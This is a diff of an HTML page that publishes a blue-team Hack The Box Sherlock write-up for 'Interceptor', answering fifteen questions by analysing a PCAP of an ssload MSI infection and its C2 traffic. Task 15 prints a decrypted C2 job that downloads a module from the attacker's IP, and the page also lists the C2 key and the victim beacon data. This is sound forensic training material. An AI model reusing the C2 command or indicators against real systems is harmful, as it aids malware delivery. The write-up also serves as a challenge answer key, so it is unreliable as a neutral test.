@@ -3,13 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="robots" content="noindex">
+    <meta name="robots" content="index, follow">
     <title>Interceptor - Hexicon Archives</title>
     <link rel="icon" type="image/x-icon" sizes="500x500" href="../favicon.png">
     <link rel="stylesheet" href="../style.css">
     <link rel="canonical" href="https://hexphased.github.io/hexicon-archives/sherlocks/Interceptor.html" />
     <!-- Sherlock-specific metadata for SEO -->
-    <meta name="description" content="Restricted writeup for Interceptor sherlock - Easy difficulty level">
+    <meta name="description" content="Writeup for Interceptor sherlock - Easy difficulty level">
     <meta name="keywords" content="Sherlock, Interceptor, Easy, Blue Team, writeup, cybersecurity, threat hunting, Hexicon">
 </head>
 <body>
@@ -64,16 +64,166 @@
         <h1 class="writeup-title">Interceptor</h1>
         <div class="writeup-metadata">
             <span class="difficulty easy">Easy</span>
-            <span class="date">Active sherlock</span>
+            <span class="date">December 25, 2025</span>
         </div>
         
         <div class="writeup-container">
             <div class="writeup-body">
                 <!-- Sherlock-specific content goes here -->
-                <p><img alt="Interceptor" src="../images/Interceptor/solved.png" /></p>
-<p>Interceptor is an <strong>ACTIVE</strong> sherlock!</p>
-<p>This write-up will go live once Interceptor retires.</p>
-<p>Please note that I’m following Hack The Box’s guidelines by not posting detailed solutions while the sherlock is still live.</p>
+                <p><img alt="solved" src="../images/Interceptor/solved.png" /></p>
+<pre class="codehilite"><code>A recent anomaly has been detected in our network traffic, suggesting a potential breach.
+Our team suspects that an unauthorized entity has infiltrated our systems and accessed confidential company data.
+Your mission is to unravel this mystery, understand the breach, and determine the extent of the compromised data.
+</code></pre>
+
+<h1>Task 1</h1>
+<p><code>What IP address did the original suspicious traffic come from?</code></p>
+<p>The only file within the challenge archive is a PCAP file. I'll load it into Wireshark for analysis.</p>
+<p><img alt="pcap" src="../images/Interceptor/pcap.png" /></p>
+<p>After going through 29 streams of encrypted packets, I can see the IP address of <code>10.4.17.101</code> successfully retrieving a signing certificate. With this in their hand they could sign malicious software to bypass certain(not all) defences.</p>
+<pre class="codehilite"><code># req
+
+GET /cacert/codesigningrootr45.crt HTTP/1.1
+Connection: Keep-Alive
+Accept: */*
+User-Agent: Microsoft-CryptoAPI/10.0
+Host: secure.globalsign.com
+
+
+HTTP/1.1 200 OK
+Date: Wed, 17 Apr 2024 19:37:42 GMT
+Content-Type: application/x-x509-ca-cert
+Content-Length: 1398
+Connection: keep-alive
+Last-Modified: Mon, 15 Aug 2022 11:54:13 GMT
+ETag: &quot;62fa33e5-576&quot;
+CF-Cache-Status: HIT
+Age: 65909
+Expires: Sat, 18 May 2024 19:37:42 GMT
+Cache-Control: public, max-age=2678400
+Accept-Ranges: bytes
+Server: cloudflare
+CF-RAY: 875edf0b4b1f6bba-DFW
+
+0..r0..Z.......vS..uFH....JH:N.0
+. *.H..
+.....0S1.0 ..U....BE1.0...U.
+..GlobalSign nv-sa1)0'..U... GlobalSign Code Signing Root R450..
+200318000000Z.
+450318000000Z0S1.0 ..U....BE1.0...U.
+..GlobalSign nv-sa1)0'..U... GlobalSign Code Signing Root R450..&quot;0
+. *.H..
+..........0..
+......-.0.z...=.r.:K..a....g.7..~.......C..E..cW]....%..h.K..K.J....j..a'..D...?&quot;..O.....(..].Y........,.3$.P:A....{.M..X8.........,..C.. t...{.3
+.Yk....Z.{..U......L.....u.o.a.tD....t..h.l&amp;&gt;.......0....|U..p\$x %.gg...N4.kp..8............;.gC....t./.... 7=gl.E\.a.A.....w
+FGs.......+....X..W....Z..%.....r=.....;D.&amp;.........E.........Bng~B.qb...`.d....!N+.mh....tsg1z....yn|..~FoM...+..&quot;D...7..aW...$..1s..5WG~.:E.-.Q.....7.e...k.w....?.0.o1..@........PvtY..m.2...~....u..J.,....+B...j6..L.................:..c...$d.......B0@0...U...........0...U.......0....0...U.........F.
+.x9...C.VP...;0
+. *.H..
+..........^+.t.4D_vH(@....n.....%.{.. .=..v...0 ..`.......x.+.2..$.RR.......9n....CA}..[.]...&amp;...tr&amp;....=;jR.&lt; ./.{.3.E......`.v....x..j...F.$......Y./]..].\..rS.AN..x.%J...bCa..7.....:...Y~0G.+k.!P3_.g...g.&lt;'....C.s.. ..a..f...9m...#7...N.k?......&gt;B&amp;.....G..R~.u....b.mO..!.&amp;&gt;.m.b0...(.n...Lrf...*.U.`g.BV\&quot;Q...N9.M...x.T;n..o....#s....d....$.......@.. 3........t;i.g.......oq.W...Z.z@j....-/...$.C....+..qo...u.:^..../.....T.~~.V.....YR.A.m[......v.@.QJp..3c#w?.'.Y....4.J.?.....gsE.x..).'........9I.M...e...wV...X.:....
+</code></pre>
+
+<p><img alt="task1" src="../images/Interceptor/task1.png" /></p>
+<h1>Task 2</h1>
+<p><code>The attacker downloaded a suspicious file. What is the HTTP method used to retrieve the properties of this file?</code></p>
+<p><img alt="propfind" src="../images/Interceptor/propfind.png" /></p>
+<p>A few streams later, the same machine uses a PROPFIND request aimed at a suspicious .msi file. This is a WebDAV request used to retrieve properties from a web resource identified by a Uniform Resource Identifier (URI).</p>
+<p>The response is an XML list of properties like timestamps, file size, and even an HTTP status code response.</p>
+<p><img alt="task2" src="../images/Interceptor/task2.png" /></p>
+<h1>Task 3</h1>
+<p><code>It appears that this file is malware. What is its filename?</code></p>
+<p>I deemed this .msi file suspicious due to a few things. First off, it is quite unusual to see a file like this in a WebDAV share. Second, this extension stands for <code>Microsoft Installer</code>. These files are used to package installation information, including files to be installed and their intended destinations. They <em>can</em> be used for malicious purposes.</p>
+<p>I'll send the file to VirusTotal to confirm whether it is malware. It can be retrieved from the PCAP by going to <code>File -&gt; Export Objects -&gt; HTTP</code></p>
+<p><img alt="virustotal" src="../images/Interceptor/virustotal.png" /></p>
+<p>Confirmed. These files are designed for silent installations, meaning that this file could potentially execute malicious code without further user interaction. I'll be on the lookout for any use of <code>msiexec</code>, as that is how these files can be executed from CLI.</p>
+<p><img alt="task3" src="../images/Interceptor/task3.png" /></p>
+<h1>Task 4</h1>
+<p><code>What is the SSDEEP hash of the malware as reported by VirusTotal?</code></p>
+<p>An SSDEEP hash is a type of fuzzy hash used to identify similarities between files or data, even when they are not identical. It is designed to detect partial matches or similarities, unlike MD5 or SHA-256, which detect 1-1 identical matches.</p>
+<p><code>https://ssdeep-project.github.io/ssdeep/index.html</code></p>
+<p>VirusTotal displays this hash and more information under its <code>details</code> tab.</p>
+<p><img alt="hashes" src="../images/Interceptor/hashes.png" /></p>
+<p><img alt="task4" src="../images/Interceptor/task4.png" /></p>
+<h1>Task 5</h1>
+<p><code>According to the NeikiAnalytics community comment on VirusTotal, to which family does the malware belong?</code></p>
+<p>After going to the <code>community</code> tab, I will search for this user's comment.</p>
+<p><img alt="comment" src="../images/Interceptor/comment.png" /></p>
+<p>They detect the malware's family as <code>ssload</code></p>
+<p><img alt="task5" src="../images/Interceptor/task5.png" /></p>
+<h1>Task 6</h1>
+<p><code>What is the creation time of the malware?</code></p>
+<p>This and a few other timestamps related to the file are stored under the <code>details</code> tab, in the history section.</p>
+<p><img alt="history" src="../images/Interceptor/history.png" /></p>
+<p>The creation time is a date taken from the file's metadata, pointing to the time of this file's creation. A malicious actor could modify it however they like, and in some circumstances, the time difference between the creation time and the <code>first seen in the wild</code> time might be suspicious.</p>
+<p><img alt="task6" src="../images/Interceptor/task6.png" /></p>
+<h1>Task 7</h1>
+<p><code>What is the domain name that the malware is trying to connect with?</code></p>
+<p>In the <code>behavior</code> tab, under the network communication section, there is a list of HTTP requests, DNS resolutions, and IPs the malware tried to reach. There is a single domain of <code>api.ipify.org</code> that it was trying to resolve.</p>
+<p><img alt="communication" src="../images/Interceptor/communication.png" /></p>
+<p>Within Wireshark, skipping forward to stream 44 reveals traffic going between the victim machine and the C2 domain, its IP being <code>85.239.53.219</code></p>
+<p><img alt="stream44" src="../images/Interceptor/stream44.png" /></p>
+<p><img alt="task7" src="../images/Interceptor/task7.png" /></p>
+<h1>Task 8</h1>
+<p><code>What is the IP address that the attacker has consistently used for communication?</code></p>
+<p>This question has been answered while solving task 7. The answer is <code>85.239.53.219</code></p>
+<p><img alt="task8" src="../images/Interceptor/task8.png" /></p>
+<h1>Task 9</h1>
+<p><code>Which file, included in the original package, is extracted and utilized by the malware during execution?</code></p>
+<p>There are three ways I could get this information:</p>
+<ol>
+<li>
+<p>Use VirusTotal's <code>behavior</code> tab to infer which files were dropped by the malware (safest);</p>
+</li>
+<li>
+<p>Use tools like LessMSI to investigate the MSI file itself for hidden files (Risky);</p>
+</li>
+<li>
+<p>Perform dynamic analysis within an enclosed VM to track the malware's actions and any tasks it initiates (Very Risky, and I do not know how the malware might behave under sterile conditions(no internet)).</p>
+</li>
+</ol>
+<p>I'll go forward with 1, as it'll allow me to avoid interacting with the malware whatsoever.</p>
+<p><img alt="files dropped" src="../images/Interceptor/files dropped.png" /></p>
+<p>Aside from a bunch of regular MSI-process related files, the malware is also dropping and opening a DLL under <code>C:\Users\&lt;USER&gt;\AppData\Local\sharepoint\forcedelctl.dll</code>. While <code>forcedelctl.dll</code> is known as a legit DLL, legitimate MSIs do not normally install system DLLs into per-user AppData directories.</p>
+<p><img alt="task9" src="../images/Interceptor/task9.png" /></p>
+<h1>Task 10</h1>
+<p><code>What program is used to execute the malware?</code></p>
+<p>The main program used for executing .msi files is <code>msiexec</code>. For standard users, double-clicking an .msi file will trigger <code>msiexec</code> and initiate the installation process. Additionally, msiexec is a LOLBIN(Living-off-the-land binary), meaning that it is a standard piece of the system and doesn't require bringing in additional software.</p>
+<p>Sophisticated malware can avoid using msiexec entirely by calling the <code>MsiInstallProduct</code> function from the <code>msi.dll</code> library.</p>
+<p>Adding to that, attackers can embed special instructions, <code>Custom Actions</code>, within an msi file, leading to potentially unwanted actions taken without the user's knowledge after the file's execution.</p>
+<p><img alt="task10" src="../images/Interceptor/task10.png" /></p>
+<h1>Task 11</h1>
+<p><code>What is the hostname of the compromised machine?</code></p>
+<p>While looking at the exchange between the victim machine and the C2 server, I could see a JSON object being sent through.</p>
+<p><code>{"version":"v1.4.0","ip":"173.66.46.97","domain":"WORKGROUP","hostname":"DESKTOP-FWQ3U4C","arch":"x86","os_version":"Windows 6.3.9600","cur_user":"User","owner":"Nevada"}</code></p>
+<p>This is most definitely an identification string sent to a C2 server. The machine will then be registered and await tasks from the attacker. The data contained within this JSON object contains information about the victim, like their IP address, computer name, architecture, and more.</p>
+<p>The victim's hostname is <code>DESKTOP-FWQ3U4C</code></p>
+<p><img alt="task11" src="../images/Interceptor/task11.png" /></p>
+<h1>Task 12</h1>
+<p><code>What is the key that was used in the attack?</code></p>
+<p>In response to the earlier request with machine data, the C2 server responds with a key and an ID.</p>
+<p><img alt="data" src="../images/Interceptor/data.png" /></p>
+<p><code>{"key": "WkZPxBoH6CA3Ok4iI", "id": "b98c911c-e29c-396e-2990-a7441af79546"}</code></p>
+<p>With this ID, the C2 server will know which machine is which. It is most likely tied to the machine data I've seen earlier. Since the key was sent together with the ID in a single object, it is safe to assume that each registered ID has its own key.</p>
+<p><img alt="task12" src="../images/Interceptor/task12.png" /></p>
+<h1>Task 13</h1>
+<p><code>What is the os_version of the compromised machine?</code></p>
+<p>The answer to this question lies in the JSON object from task 11. It is <code>Windows 6.3.9600</code></p>
+<p><img alt="task13" src="../images/Interceptor/task13.png" /></p>
+<h1>Task 14</h1>
+<p><code>What is the owner name of the compromised machine?</code></p>
+<p>Same as the previous question, this value has been revealed in the JSON object from task 11. The answer is <code>Nevada</code></p>
+<p><img alt="task14" src="../images/Interceptor/task14.png" /></p>
+<h1>Task 15</h1>
+<p><code>After decrypting the communication from the malware, what command is revealed to be sent to the C2 server?</code></p>
+<p>Afterwards, the C2 server responds with an ID and an encoded job value. The two equal signs at the end point towards base64 being used.</p>
+<p><img alt="response" src="../images/Interceptor/response.png" /></p>
+<p>However, decoding it returns garbage only. I'll research online about the ssload malware family.</p>
+<p><img alt="garbage" src="../images/Interceptor/garbage.png" /></p>
+<p><code>https://intezer.com/blog/ssload-technical-malware-analysis/</code></p>
+<p>This is a really nice article that explains the infection chain, each component of the malware, and its purpose in detail. With it, I found out that the malware uses RC4 to encrypt its job structures. Since I have a key already, I'll add an RC4 recipe to the first decoding attempt, using the plaintext key as a UTF-8 passphrase.</p>
+<p><img alt="decrypt" src="../images/Interceptor/decrypt.png" /></p>
+<p>Answer: <code>{"command": "exe", "args": ["http://85.239.53.219/download?id=Nevada&amp;module=2&amp;filename=None"]}</code></p>
+<p><img alt="task15" src="../images/Interceptor/task15.png" /></p>
+<p>Solved!</p>
             </div>
             
             <div class="toc-sidebar">
@@ -92,7 +242,7 @@
     
     <footer>
         <div class="container">
-            <p>&copy; 2025 Hexicon Archives | Created by Hexicon</p>
+            <p>&copy; 2026 Hexicon Archives | Created by Hexicon</p>
         </div>
     </footer>
 
